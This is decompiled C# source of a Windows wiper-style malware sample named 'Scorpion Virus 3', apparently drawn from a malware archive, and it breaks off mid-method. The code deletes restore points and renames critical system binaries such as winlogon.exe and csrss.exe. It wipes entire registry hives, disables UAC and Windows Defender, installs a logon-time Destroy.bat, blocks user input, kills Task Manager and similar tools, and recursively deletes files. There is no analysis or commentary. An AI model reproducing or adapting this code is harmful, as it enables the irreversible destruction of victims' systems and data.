// Decompiled with JetBrains decompiler
// Type: Scorpion_Virus_3.Form1
// Assembly: Scorpion Virus 3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 972D4062-A93E-4DCA-92BE-D2183A70246A
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Ransomware\Scorpion Virus 3.1\Scorpion Virus 3.1.7z\Scorpion Virus 3.exe

using AxWMPLib;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Scorpion_Virus_3.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using WMPLib;

#nullable disable
namespace Scorpion_Virus_3;

[DesignerGenerated]
public class Form1 : Form
{
  private static List<WeakReference> __ENCList = new List<WeakReference>();
  private IContainer components;
  [AccessedThroughProperty("AxWindowsMediaPlayer1")]
  private AxWindowsMediaPlayer _AxWindowsMediaPlayer1;
  [AccessedThroughProperty("AxWindowsMediaPlayer2")]
  private AxWindowsMediaPlayer _AxWindowsMediaPlayer2;
  [AccessedThroughProperty("Timer1")]
  private Timer _Timer1;
  [AccessedThroughProperty("Timer2")]
  private Timer _Timer2;
  [AccessedThroughProperty("Label1")]
  private Label _Label1;
  [AccessedThroughProperty("Timer3")]
  private Timer _Timer3;
  [AccessedThroughProperty("Label2")]
  private Label _Label2;
  [AccessedThroughProperty("Timer4")]
  private Timer _Timer4;
  [AccessedThroughProperty("Timer5")]
  private Timer _Timer5;
  [AccessedThroughProperty("Label3")]
  private Label _Label3;
  [AccessedThroughProperty("Timer6")]
  private Timer _Timer6;
  private string FilePath;
  public string str;
  public string str2;
  public string str3;
  public int count;

  [DebuggerNonUserCode]
  static Form1()
  {
  }

  public Form1()
  {
    this.Load += new EventHandler(this.Form1_Load);
    this.Shown += new EventHandler(this.Form1_Shown);
    Form1.__ENCAddToList((object) this);
    this.str = "Your Computer is Infected By Scorpion Virus , Enjoy !";
    this.str2 = "When You Shutdown Windows You Can't Open It Again ^_^";
    this.str3 = "Bye Bye Windows";
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  private static void __ENCAddToList(object value)
  {
    lock (Form1.__ENCList)
    {
      if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
      {
        int index1 = 0;
        int num = checked (Form1.__ENCList.Count - 1);
        int index2 = 0;
        while (index2 <= num)
        {
          if (Form1.__ENCList[index2].IsAlive)
          {
            if (index2 != index1)
              Form1.__ENCList[index1] = Form1.__ENCList[index2];
            checked { ++index1; }
          }
          checked { ++index2; }
        }
        Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
        Form1.__ENCList.Capacity = Form1.__ENCList.Count;
      }
      Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
    }
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.components == null)
        return;
      this.components.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.components = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
    this.Timer1 = new Timer(this.components);
    this.Timer2 = new Timer(this.components);
    this.Label1 = new Label();
    this.AxWindowsMediaPlayer2 = new AxWindowsMediaPlayer();
    this.Timer3 = new Timer(this.components);
    this.Label2 = new Label();
    this.Timer4 = new Timer(this.components);
    this.Timer5 = new Timer(this.components);
    this.Label3 = new Label();
    this.Timer6 = new Timer(this.components);
    this.AxWindowsMediaPlayer2.BeginInit();
    this.SuspendLayout();
    this.Timer1.Enabled = true;
    this.Timer1.Interval = 500;
    this.Timer2.Enabled = true;
    this.Timer2.Interval = 500;
    this.Label1.AutoSize = true;
    this.Label1.BackColor = Color.Black;
    this.Label1.Font = new Font("Yu Gothic UI", 24f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
    this.Label1.ForeColor = Color.Red;
    Label label1_1 = this.Label1;
    Point point1 = new Point(12, 76);
    Point point2 = point1;
    label1_1.Location = point2;
    this.Label1.Name = "Label1";
    Label label1_2 = this.Label1;
    Size size1 = new Size(34, 45);
    Size size2 = size1;
    label1_2.Size = size2;
    this.Label1.TabIndex = 1;
    this.Label1.Text = "*";
    this.Label1.TextAlign = ContentAlignment.MiddleCenter;
    this.Label1.Visible = false;
    this.AxWindowsMediaPlayer2.Dock = DockStyle.Fill;
    this.AxWindowsMediaPlayer2.Enabled = true;
    AxWindowsMediaPlayer windowsMediaPlayer2_1 = this.AxWindowsMediaPlayer2;
    point1 = new Point(0, 0);
    Point point3 = point1;
    windowsMediaPlayer2_1.Location = point3;
    this.AxWindowsMediaPlayer2.Name = "AxWindowsMediaPlayer2";
    this.AxWindowsMediaPlayer2.OcxState = (AxHost.State) componentResourceManager.GetObject("AxWindowsMediaPlayer2.OcxState");
    AxWindowsMediaPlayer windowsMediaPlayer2_2 = this.AxWindowsMediaPlayer2;
    size1 = new Size(284, 261);
    Size size3 = size1;
    windowsMediaPlayer2_2.Size = size3;
    this.AxWindowsMediaPlayer2.TabIndex = 0;
    this.Timer3.Interval = 200;
    this.Label2.AutoSize = true;
    this.Label2.BackColor = Color.Black;
    this.Label2.Font = new Font("Yu Gothic UI", 24f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
    this.Label2.ForeColor = Color.Red;
    Label label2_1 = this.Label2;
    point1 = new Point(12, 121);
    Point point4 = point1;
    label2_1.Location = point4;
    this.Label2.Name = "Label2";
    Label label2_2 = this.Label2;
    size1 = new Size(34, 45);
    Size size4 = size1;
    label2_2.Size = size4;
    this.Label2.TabIndex = 2;
    this.Label2.Text = "*";
    this.Label2.TextAlign = ContentAlignment.MiddleCenter;
    this.Label2.Visible = false;
    this.Timer4.Interval = 200;
    this.Timer5.Interval = 200;
    this.Label3.AutoSize = true;
    this.Label3.BackColor = Color.Black;
    this.Label3.Font = new Font("Yu Gothic UI", 24f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
    this.Label3.ForeColor = Color.Red;
    Label label3_1 = this.Label3;
    point1 = new Point(12, 166);
    Point point5 = point1;
    label3_1.Location = point5;
    this.Label3.Name = "Label3";
    Label label3_2 = this.Label3;
    size1 = new Size(34, 45);
    Size size5 = size1;
    label3_2.Size = size5;
    this.Label3.TabIndex = 3;
    this.Label3.Text = "*";
    this.Label3.TextAlign = ContentAlignment.MiddleCenter;
    this.Label3.Visible = false;
    this.Timer6.Interval = 250;
    this.BackColor = SystemColors.ActiveCaptionText;
    size1 = new Size(284, 261);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.Label3);
    this.Controls.Add((Control) this.Label2);
    this.Controls.Add((Control) this.Label1);
    this.Controls.Add((Control) this.AxWindowsMediaPlayer2);
    this.FormBorderStyle = FormBorderStyle.None;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = nameof (Form1);
    this.ShowIcon = false;
    this.StartPosition = FormStartPosition.CenterParent;
    this.TopMost = true;
    this.WindowState = FormWindowState.Maximized;
    this.AxWindowsMediaPlayer2.EndInit();
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual AxWindowsMediaPlayer AxWindowsMediaPlayer1
  {
    [DebuggerNonUserCode] get => this._AxWindowsMediaPlayer1;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._AxWindowsMediaPlayer1 = value;
    }
  }

  internal virtual AxWindowsMediaPlayer AxWindowsMediaPlayer2
  {
    [DebuggerNonUserCode] get => this._AxWindowsMediaPlayer2;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler1 = new EventHandler(this.AxWindowsMediaPlayer2_StatusChange);
      EventHandler eventHandler2 = new EventHandler(this.AxWindowsMediaPlayer2_Enter);
      if (this._AxWindowsMediaPlayer2 != null)
      {
        this._AxWindowsMediaPlayer2.StatusChange -= eventHandler1;
        this._AxWindowsMediaPlayer2.Enter -= eventHandler2;
      }
      this._AxWindowsMediaPlayer2 = value;
      if (this._AxWindowsMediaPlayer2 == null)
        return;
      this._AxWindowsMediaPlayer2.StatusChange += eventHandler1;
      this._AxWindowsMediaPlayer2.Enter += eventHandler2;
    }
  }

  internal virtual Timer Timer1
  {
    [DebuggerNonUserCode] get => this._Timer1;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
      if (this._Timer1 != null)
        this._Timer1.Tick -= eventHandler;
      this._Timer1 = value;
      if (this._Timer1 == null)
        return;
      this._Timer1.Tick += eventHandler;
    }
  }

  internal virtual Timer Timer2
  {
    [DebuggerNonUserCode] get => this._Timer2;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
      if (this._Timer2 != null)
        this._Timer2.Tick -= eventHandler;
      this._Timer2 = value;
      if (this._Timer2 == null)
        return;
      this._Timer2.Tick += eventHandler;
    }
  }

  internal virtual Label Label1
  {
    [DebuggerNonUserCode] get => this._Label1;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
  }

  internal virtual Timer Timer3
  {
    [DebuggerNonUserCode] get => this._Timer3;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
      if (this._Timer3 != null)
        this._Timer3.Tick -= eventHandler;
      this._Timer3 = value;
      if (this._Timer3 == null)
        return;
      this._Timer3.Tick += eventHandler;
    }
  }

  internal virtual Label Label2
  {
    [DebuggerNonUserCode] get => this._Label2;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Label2_Click);
      if (this._Label2 != null)
        this._Label2.Click -= eventHandler;
      this._Label2 = value;
      if (this._Label2 == null)
        return;
      this._Label2.Click += eventHandler;
    }
  }

  internal virtual Timer Timer4
  {
    [DebuggerNonUserCode] get => this._Timer4;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Timer4_Tick);
      if (this._Timer4 != null)
        this._Timer4.Tick -= eventHandler;
      this._Timer4 = value;
      if (this._Timer4 == null)
        return;
      this._Timer4.Tick += eventHandler;
    }
  }

  internal virtual Timer Timer5
  {
    [DebuggerNonUserCode] get => this._Timer5;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Timer5_Tick);
      if (this._Timer5 != null)
        this._Timer5.Tick -= eventHandler;
      this._Timer5 = value;
      if (this._Timer5 == null)
        return;
      this._Timer5.Tick += eventHandler;
    }
  }

  internal virtual Label Label3
  {
    [DebuggerNonUserCode] get => this._Label3;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label3 = value;
  }

  internal virtual Timer Timer6
  {
    [DebuggerNonUserCode] get => this._Timer6;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Timer6_Tick);
      if (this._Timer6 != null)
        this._Timer6.Tick -= eventHandler;
      this._Timer6 = value;
      if (this._Timer6 == null)
        return;
      this._Timer6.Tick += eventHandler;
    }
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int BlockInput(int fBlock);

  private void PlayVideo()
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      Application.DoEvents();
label_3:
      num3 = 3;
      this.AxWindowsMediaPlayer2.uiMode = "none";
label_4:
      num3 = 4;
      Application.DoEvents();
label_5:
      num3 = 5;
      this.AxWindowsMediaPlayer2.URL = this.FilePath;
label_6:
      num3 = 6;
      this.AxWindowsMediaPlayer2.Ctlcontrols.play();
label_7:
      num3 = 7;
      Application.DoEvents();
      goto label_10;
label_8:
      num3 = 10;
      Application.DoEvents();
label_9:
label_10:
      num3 = 9;
      if (this.AxWindowsMediaPlayer2.playState != WMPPlayState.wmppsPlaying)
        goto label_8;
label_11:
      num3 = 12;
      this.AxWindowsMediaPlayer2.fullScreen = true;
      goto label_18;
label_13:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_6;
            case 7:
              goto label_7;
            case 8:
            case 9:
              goto label_10;
            case 10:
              goto label_8;
            case 11:
              goto label_9;
            case 12:
              goto label_11;
            case 13:
              goto label_18;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_13;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_18:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void Form1_Load(object sender, EventArgs e)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      Application.DoEvents();
label_3:
      num3 = 3;
      this.Label1.Visible = false;
label_4:
      num3 = 4;
      this.Label2.Visible = false;
label_5:
      num3 = 5;
      this.Label3.Visible = false;
label_6:
      num3 = 6;
      this.Label1.Text = "";
label_7:
      num3 = 7;
      this.Label2.Text = "";
label_8:
      num3 = 8;
      this.Label3.Text = "";
label_9:
      num3 = 9;
      Application.DoEvents();
label_10:
      num3 = 10;
      this.deleteRes();
label_11:
      num3 = 11;
      Interaction.Shell($"takeown /F {Environment.GetFolderPath(Environment.SpecialFolder.System)}\\winlogon.exe");
label_12:
      num3 = 12;
      Interaction.Shell($"ICACLS {Environment.GetFolderPath(Environment.SpecialFolder.System)}\\winlogon.exe /grant administrators:F");
label_13:
      num3 = 13;
      MyProject.Computer.FileSystem.RenameFile(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\winlogon.exe", "SS1");
label_14:
      num3 = 14;
      Interaction.Shell($"takeown /F {Environment.GetFolderPath(Environment.SpecialFolder.System)}\\wininit.exe");
label_15:
      num3 = 15;
      Interaction.Shell($"ICACLS {Environment.GetFolderPath(Environment.SpecialFolder.System)}\\wininit.exe /grant administrators:F");
label_16:
      num3 = 16 /*0x10*/;
      MyProject.Computer.FileSystem.RenameFile(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\wininit.exe", "SS2");
label_17:
      num3 = 17;
      Interaction.Shell($"takeown /F {Environment.GetFolderPath(Environment.SpecialFolder.System)}\\csrss.exe");
label_18:
      num3 = 18;
      Interaction.Shell($"ICACLS {Environment.GetFolderPath(Environment.SpecialFolder.System)}\\csrss.exe /grant administrators:F");
label_19:
      num3 = 19;
      MyProject.Computer.FileSystem.RenameFile(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\csrss.exe", "SS3");
label_20:
      num3 = 20;
      Interaction.Shell($"takeown /F {Environment.GetFolderPath(Environment.SpecialFolder.System)}\\svchost.exe");
label_21:
      num3 = 21;
      Interaction.Shell($"ICACLS {Environment.GetFolderPath(Environment.SpecialFolder.System)}\\svchost.exe /grant administrators:F");
label_22:
      num3 = 22;
      MyProject.Computer.FileSystem.RenameFile(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svchost.exe", "SS4");
label_23:
      num3 = 23;
      Interaction.Shell("Reg delete HKEY_CLASSES_ROOT /f");
label_24:
      num3 = 24;
      Interaction.Shell("Reg delete HKEY_CURRENT_USER /f");
label_25:
      num3 = 25;
      Interaction.Shell("Reg delete HKEY_LOCAL_MACHINE /f");
label_26:
      num3 = 26;
      Interaction.Shell("Reg delete HKEY_USERS /f");
label_27:
      num3 = 27;
      Interaction.Shell("Reg delete HKEY_CURRENT_CONFIG /f");
label_28:
      num3 = 28;
      Application.DoEvents();
label_29:
      num3 = 29;
      MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object) 0);
label_30:
      num3 = 30;
      MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) 1);
label_31:
      num3 = 31 /*0x1F*/;
      MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend", "Start", (object) 4);
label_32:
      num3 = 32 /*0x20*/;
      MyProject.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true).SetValue("Userinit", (object) (Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Destroy.bat,"));
label_33:
      num3 = 33;
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies", "DisableRegistryTools", (object) 2);
label_34:
      num3 = 34;
      Interaction.Shell("rename-item HKLM:\\SYSTEM\\CurrentControlSet\\Contro l\\SafeBoot\\Minimal Minimal.backup");
label_35:
      num3 = 35;
      Interaction.Shell("rename-item HKLM:\\SYSTEM\\CurrentControlSet\\Contro l\\SafeBoot\\Network Network.backup");
label_36:
      num3 = 36;
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Destroy.bat", (object) "RUNASADMIN HIGHDPIAWARE");
label_37:
      num3 = 37;
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\StartBlueScreen.exe", (object) "RUNASADMIN HIGHDPIAWARE");
label_38:
      num3 = 38;
      Application.DoEvents();
label_39:
      num3 = 39;
      Interaction.Shell("nircmd.exe mutesysvolume 0");
label_40:
      num3 = 40;
      Interaction.Shell("nircmd.exe setsysvolume 65535");
label_41:
      num3 = 41;
      this.TopMost = true;
label_42:
      num3 = 42;
      this.BringToFront();
label_43:
      num3 = 43;
      this.Focus();
label_44:
      num3 = 44;
      this.WindowState = FormWindowState.Maximized;
label_45:
      num3 = 45;
      Application.DoEvents();
label_46:
      num3 = 46;
      this.FilePath = Path.Combine(Application.StartupPath, "SV3.mp4");
label_47:
      num3 = 47;
      if (File.Exists(this.FilePath))
        goto label_50;
label_48:
      num3 = 48 /*0x30*/;
      Application.DoEvents();
label_49:
      num3 = 49;
      File.WriteAllBytes(this.FilePath, Scorpion_Virus_3.My.Resources.Resources.Scorpion_Virus);
label_50:
label_51:
      num3 = 51;
      Application.DoEvents();
label_52:
      num3 = 52;
      File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\StartBlueScreen.exe", Scorpion_Virus_3.My.Resources.Resources.StartBlueScreen);
label_53:
      num3 = 53;
      File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Destroy.bat", Scorpion_Virus_3.My.Resources.Resources.Destroy);
label_54:
      num3 = 54;
      Application.DoEvents();
      goto label_61;
label_56:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_6;
            case 7:
              goto label_7;
            case 8:
              goto label_8;
            case 9:
              goto label_9;
            case 10:
              goto label_10;
            case 11:
              goto label_11;
            case 12:
              goto label_12;
            case 13:
              goto label_13;
            case 14:
              goto label_14;
            case 15:
              goto label_15;
            case 16 /*0x10*/:
              goto label_16;
            case 17:
              goto label_17;
            case 18:
              goto label_18;
            case 19:
              goto label_19;
            case 20:
              goto label_20;
            case 21:
              goto label_21;
            case 22:
              goto label_22;
            case 23:
              goto label_23;
            case 24:
              goto label_24;
            case 25:
              goto label_25;
            case 26:
              goto label_26;
            case 27:
              goto label_27;
            case 28:
              goto label_28;
            case 29:
              goto label_29;
            case 30:
              goto label_30;
            case 31 /*0x1F*/:
              goto label_31;
            case 32 /*0x20*/:
              goto label_32;
            case 33:
              goto label_33;
            case 34:
              goto label_34;
            case 35:
              goto label_35;
            case 36:
              goto label_36;
            case 37:
              goto label_37;
            case 38:
              goto label_38;
            case 39:
              goto label_39;
            case 40:
              goto label_40;
            case 41:
              goto label_41;
            case 42:
              goto label_42;
            case 43:
              goto label_43;
            case 44:
              goto label_44;
            case 45:
              goto label_45;
            case 46:
              goto label_46;
            case 47:
              goto label_47;
            case 48 /*0x30*/:
              goto label_48;
            case 49:
              goto label_49;
            case 50:
              goto label_50;
            case 51:
              goto label_51;
            case 52:
              goto label_52;
            case 53:
              goto label_53;
            case 54:
              goto label_54;
            case 55:
              goto label_61;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_56;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_61:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  [DllImport("Srclient.dll")]
  public static extern int SRRemoveRestorePoint(int index);

  public void deleteRes()
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      ManagementClass managementClass = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
label_3:
      num3 = 3;
      ManagementObjectCollection instances = managementClass.GetInstances();
label_4:
      num3 = 4;
      ManagementObjectCollection.ManagementObjectEnumerator enumerator = instances.GetEnumerator();
      goto label_10;
label_6:
      num3 = 5;
      ManagementObject current;
      string str = Conversions.ToUInteger(current["sequencenumber"]).ToString();
label_7:
      num3 = 6;
      int integer = Conversions.ToInteger(str);
label_8:
      num3 = 7;
      Form1.SRRemoveRestorePoint(integer);
label_9:
      num3 = 8;
label_10:
      if (enumerator.MoveNext())
      {
        current = (ManagementObject) enumerator.Current;
        goto label_6;
      }
      enumerator?.Dispose();
      goto label_20;
label_15:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_6;
            case 6:
              goto label_7;
            case 7:
              goto label_8;
            case 8:
              goto label_9;
            case 9:
              goto label_20;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_15;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_20:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public void WalkDirRecursive(string vPath)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      Application.DoEvents();
label_3:
      num3 = 3;
      DirectoryInfo directoryInfo = new DirectoryInfo(vPath);
label_4:
      num3 = 4;
      Application.DoEvents();
label_5:
      num3 = 5;
      if (!directoryInfo.Exists)
        goto label_32;
label_6:
      num3 = 8;
      Application.DoEvents();
label_7:
      num3 = 9;
      string[] files = Directory.GetFiles(directoryInfo.FullName);
      int index1 = 0;
      goto label_19;
label_9:
      num3 = 10;
      Application.DoEvents();
label_10:
      num3 = 11;
      string str;
      if (!(str.Contains("Destroy.bat") | str.Contains("StartBlueScreen.exe") | str.Contains("SV3.mp4")))
        goto label_12;
label_11:
      num3 = 12;
      Application.DoEvents();
      goto label_16;
label_12:
      num3 = 14;
label_13:
      num3 = 15;
      Application.DoEvents();
label_14:
      num3 = 16 /*0x10*/;
      FileSystem.SetAttr(str, FileAttribute.Normal);
label_15:
      num3 = 17;
      MyProject.Computer.FileSystem.DeleteFile(str);
label_16:
label_17:
      num3 = 19;
      Application.DoEvents();
      checked { ++index1; }
label_18:
      num3 = 20;
label_19:
      if (index1 < files.Length)
      {
        str = files[index1];
        goto label_9;
      }
label_20:
      num3 = 21;
      string[] directories = Directory.GetDirectories(directoryInfo.FullName);
      int index2 = 0;
      goto label_25;
label_22:
      num3 = 22;
      Application.DoEvents();
label_23:
      num3 = 23;
      string vPath1;
      this.WalkDirRecursive(vPath1);
      checked { ++index2; }
label_24:
      num3 = 24;
label_25:
      if (index2 < directories.Length)
      {
        vPath1 = directories[index2];
        goto label_22;
      }
      goto label_32;
label_27:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
            case 25:
              goto label_32;
            case 7:
            case 8:
              goto label_6;
            case 9:
              goto label_7;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
            case 12:
              goto label_11;
            case 13:
            case 18:
              goto label_16;
            case 14:
              goto label_12;
            case 15:
              goto label_13;
            case 16 /*0x10*/:
              goto label_14;
            case 17:
              goto label_15;
            case 19:
              goto label_17;
            case 20:
              goto label_18;
            case 21:
              goto label_20;
            case 22:
              goto label_22;
            case 23:
              goto label_23;
            case 24:
              goto label_24;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_27;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_32:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void AxWindowsMediaPlayer2_StatusChange(object sender, EventArgs e)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      if (this.AxWindowsMediaPlayer2.playState != WMPPlayState.wmppsStopped)
        goto label_7;
label_3:
      num3 = 3;
      Application.DoEvents();
label_4:
      num3 = 4;
      this.Timer3.Enabled = true;
label_5:
      num3 = 5;
      this.AxWindowsMediaPlayer2.Visible = false;
label_6:
      num3 = 6;
      Application.DoEvents();
label_7:
      goto label_14;
label_9:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_6;
            case 7:
              goto label_7;
            case 8:
              goto label_14;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_9;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_14:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void Timer1_Tick(object sender, EventArgs e)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      Application.DoEvents();
label_3:
      num3 = 3;
      Form1.BlockInput(1);
label_4:
      num3 = 4;
      Application.DoEvents();
      goto label_11;
label_6:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_11;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_6;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_11:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void Timer2_Tick(object sender, EventArgs e)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      Application.DoEvents();
label_3:
      num3 = 3;
      Process[] processes = Process.GetProcesses();
      int index = 0;
      goto label_29;
label_5:
      num3 = 4;
      Application.DoEvents();
label_6:
      num3 = 5;
      Process process;
      if (Operators.CompareString(process.ProcessName, "taskmgr", false) != 0)
        goto label_8;
label_7:
      num3 = 6;
      process.Kill();
label_8:
label_9:
      num3 = 8;
      if (Operators.CompareString(process.ProcessName, "notepad", false) != 0)
        goto label_11;
label_10:
      num3 = 9;
      process.Kill();
label_11:
label_12:
      num3 = 11;
      if (Operators.CompareString(process.ProcessName, "regedit", false) != 0)
        goto label_14;
label_13:
      num3 = 12;
      process.Kill();
label_14:
label_15:
      num3 = 14;
      if (Operators.CompareString(process.ProcessName, "cmd", false) != 0)
        goto label_17;
label_16:
      num3 = 15;
      process.Kill();
label_17:
label_18:
      num3 = 17;
      if (Operators.CompareString(process.ProcessName, "Taskmgr", false) != 0)
        goto label_20;
label_19:
      num3 = 18;
      process.Kill();
label_20:
label_21:
      num3 = 20;
      if (Operators.CompareString(process.ProcessName, "SystemPropertiesProtection", false) != 0)
        goto label_23;
label_22:
      num3 = 21;
      process.Kill();
label_23:
label_24:
      num3 = 23;
      if (Operators.CompareString(process.ProcessName, "processexplorer", false) != 0)
        goto label_26;
label_25:
      num3 = 24;
      process.Kill();
label_26:
label_27:
      num3 = 26;
